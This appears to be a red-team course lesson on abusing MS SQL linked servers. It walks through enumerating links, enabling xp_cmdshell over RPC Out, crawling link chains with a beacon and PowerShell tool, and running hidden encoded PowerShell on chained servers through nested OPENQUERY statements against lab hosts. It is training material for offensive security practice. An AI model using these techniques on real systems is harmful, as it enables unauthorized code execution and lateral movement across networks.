SQL Servers have a concept called "Linked Servers", which allows a database instance to access data from an external source. MS SQL supports multiple sources, including other MS SQL Servers. These can also be practically anywhere - including other domains, forests or in the cloud.

We can discover any links that the current instance has:

```
SELECT * FROM master..sysservers;
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/srv1-link.png)

  

We can query this remote instance over the link using **OpenQuery**:

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

>  The use of double and single quotes are important when using OpenQuery.

That includes being able to query its configuration (e.g. xp_cmdshell).

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```


If xp_cmdshell is disabled, you can't enable it by executing `sp_configure` via OpenQuery. If **RPC Out** is enabled on the link (which is not the default configuration), then you can enable xpcmdshell using the following syntax:

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```
>  The square braces are required as part of the SQL syntax.

  

Manually querying databases to find links can be cumbersome and time-consuming, so you can also use `Get-SQLServerLinkCrawl` to automatically crawl all available links.

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       : 
```

This output shows a chain from `SRV-1 > SQL-1.CYBERBOTIC.IO > SQL01.ZEROPOINTSECURITY.LOCAL`, the links are configured with local `sa` accounts, and we have sysadmin privileges on each instance.

To execute a shell command on `sql-1.cyberbotic.io`:

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sql1-beacon.png)

  

And to execute a shell command on `sql01.zeropointsecurity.local`, we have to embed multiple OpenQuery statements (the single quotes get exponentially more silly the deeper you go):

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sql01-beacon.png)